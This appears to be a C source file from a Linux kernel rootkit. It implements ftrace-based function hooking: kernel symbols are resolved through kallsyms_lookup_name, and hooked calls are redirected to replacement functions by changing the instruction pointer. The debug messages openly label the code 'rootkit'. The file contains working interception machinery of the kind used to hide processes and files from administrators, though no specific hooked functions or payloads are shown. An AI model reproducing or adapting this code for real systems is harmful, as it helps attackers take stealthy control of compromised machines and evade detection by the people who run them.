#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/version.h>

#define HOOK(_name, _function, _original) \
{   \
    .name = (_name), \
    .function = (_function), \
    .original = (_original), \
}

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    
    unsigned long address;
    struct ftrace_ops ops;
};

static int resolve_hook_address(struct ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_DEBUG "unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *)hook->original) = hook->address;
    return 0;
}

static void notrace fh_trace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs) {
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;    
}

int fh_install_hook(struct ftrace_hook *hook) {
    int err;
    err = resolve_hook_address(hook);
    if (err)
        return err;
    
    hook->ops.func = fh_trace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS 
                | FTRACE_OPS_FL_RECURSION_SAFE
                | FTRACE_OPS_FL_IPMODIFY;
    //设置函数入口点
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }    

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk(KERN_DEBUG "rootkit: ungister_ftrace_function() failed: %d\n", err);

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
    int err;
    size_t i;

    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }
    return 0;

error:
    while (i != 0) {
        fh_remove_hook(&hooks[--i]);
    }    
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;

    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}